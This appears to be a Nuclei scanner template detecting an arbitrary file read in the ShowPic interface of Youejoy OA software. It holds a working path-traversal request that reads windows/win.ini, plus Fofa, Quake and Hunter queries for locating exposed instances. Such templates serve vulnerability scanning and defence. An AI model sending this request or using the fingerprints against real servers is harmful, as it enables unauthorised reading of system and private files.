id: Youejoy_OA_ShowPic_Fileread

info:
  name: Youejoy_OA_ShowPic_Fileread
  author: HK
  severity: medium
  description: 易捷OA协同办公软件ShowPic接口存在任意文件读取
  metadata:
    max-request: 1
    Fofa-query: body="/images/logon/bg_img.jpg"
    Quake-query: body="/images/logon/bg_img.jpg"
    Hunter-query: body="/images/logon/bg_img.jpg"
    verified: true

http:
- raw:
  - |+
    @timeout: 30s
    GET /servlet/ShowPic?filePath=../../windows/win.ini HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: close

  max-redirects: 3
  cookie-reuse: true
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - "[extensions]"